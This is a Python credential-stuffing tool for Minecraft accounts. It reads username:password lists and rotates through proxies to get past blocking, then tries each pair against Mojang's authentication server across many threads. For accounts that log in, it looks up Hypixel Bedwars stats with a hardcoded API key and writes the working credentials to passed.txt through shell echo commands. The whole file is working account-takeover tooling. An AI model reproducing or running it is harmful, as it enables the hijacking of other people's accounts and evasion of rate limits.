import json
import logging
import requests
from threading import Thread
import os
import cmdscreen
import time
import inspect
import ctypes

global start
start = 'doit'
global Thread_pool
Thread_pool = []
global gobal_num

def _async_raise(tid, exctype):
   """raises the exception, performs cleanup if needed"""
   tid = ctypes.c_long(tid)
   if not inspect.isclass(exctype):
      exctype = type(exctype)
   res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
   if res == 0:
      raise ValueError("invalid thread id")
   elif res != 1:
      # """if it returns a number greater than one, you're in trouble,  
      # and you should call it again with exc=NULL to revert the effect"""  
      ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
      raise SystemError("PyThreadState_SetAsyncExc failed")

f = open('proxies.txt','r')

LOG_FORMAT = "[%(asctime)s] %(levelname)s: %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT, datefmt="%H:%M:%S")
log = logging.getLogger(__name__)

def login(username, password,threadid):
	while True:
		if start == 'doit':
			global gobal_num
			url = "https://authserver.mojang.com/authenticate"
			payload = {
				"agent": {
					"name": "Minecraft",
					"version": 1
				},
				"username": username,
				"password": password
			}
			proxies = f.readline().replace("\n","")
			#cmdscreen.set_cmd_text_color(0x02)
			log.info("[Thread#"+str(threadid)+"]Checking " +username+":"+password+"proxy:"+proxies)
			#cmdscreen.set_cmd_text_color(0x07)
			try:
				resp = requests.post(url, json=payload, headers={"Content-Type": "application/json"},proxies={"http":"http://"+proxies+"/","https":"https://"+proxies+"/"})
			except:
				#cmdscreen.set_cmd_text_color(0x04)
				log.error("[Thread#"+str(threadid)+"]An error has occured whilst POSTing to Minecraft")
				gobal_num=gobal_num+1
				_async_raise(Thread_pool[threadid-1].ident, SystemExit)
				#cmdscreen.set_cmd_text_color(0x07)
				return

			if resp.status_code == 403:
				if "Invalid username or password." in resp.text:
					log.error(username+":"+password+" is invalid")
				else:log.error("[Thread#"+str(threadid)+"]Account information is wrong (or you're shadowbanned)")
					
			try:
				json_data = json.loads(resp.text)
			except:
				#cmdscreen.set_cmd_text_color(0x04)
				if("<HEAD>" in resp.text):
					gobal_num=gobal_num+1
					log.error("[Thread#"+str(threadid)+"]proxy has been block!")
					_async_raise(Thread_pool[threadid-1].ident, SystemExit)
				else:
					log.info(resp.text+"\n"+"col:"+str(threadid))
					#cmdscreen.set_cmd_text_color(0x07)
					gobal_num=gobal_num+1
					_async_raise(Thread_pool[threadid-1].ident, SystemExit)
			if "selectedProfile" in resp.json():
				name = resp.json()["selectedProfile"]["name"]
				#cmdscreen.set_cmd_text_color(0x02)
				try:
					r = requests.get("http://api.hypixel.net/player?key=53210137-a980-473a-9dd4-d0d792c2b6b5&name="+name,timeout=10)
					log.info("[Thread#"+str(threadid)+"]"+username+":"+password+" was successfully logged into Minecraft!Name:"+name+"BedwarsLeveL:"+str((int(r.json()["player"]["stats"]["Bedwars"])-3500)/5000))
					execute = "Echo "+username+":"+password+":"+str((int(r.json()["player"]["stats"]["Bedwars"])-3500)/5000)+" >>passed.txt"
					os.system(execute)
				except:
					log.info("[Thread#"+str(threadid)+"]"+username+":"+password+" was successfully logged into Minecraft!Name:"+name)
				finally:
					#cmdscreen.set_cmd_text_color(0x07)
					execute = "Echo "+username+":"+password+" >>passed.txt"
					os.system(execute)
			gobal_num=gobal_num+1
			_async_raise(Thread_pool[threadid-1].ident, SystemExit)
		time.sleep(1)

if __name__ == "__main__":
	global gobal_num
	gobal_num=1
	i=1
	u1 = open('users.txt', 'r',encoding="utf-8",errors="ignore")
	p1 = open('proxies.txt','r')
	list1 = u1.readlines()
	log.info("Loaded "+str(len(list1))+" account(s).")
	list2 = p1.readlines()
	log.info("Loaded "+str(len(list2))+" proxy(ies).")
	if len(list2) <= len(list1):
		log.error("No enought proxies to check Minecraft account(s).")
		exit(-1)
	try:
		for user in range(len(list1)):
			user_data = list1[user].split(':')
			Thread_pool.append(Thread(target=login,args=(user_data[0], user_data[1].replace('\n',''),i)))
			#print(user_data)
			#print(user_data[0])
			i=i+1
	except:
		pass
	for i in range(len(Thread_pool)) :
		#time.sleep(0.5) 
		Thread_pool[i].setDaemon(True)
		Thread_pool[i].start()
		log.info("creating Thread#"+str(i)+" Please wait.")
	start = 'doit'
	while True:
		if gobal_num == len(Thread_pool):
			exit(1)
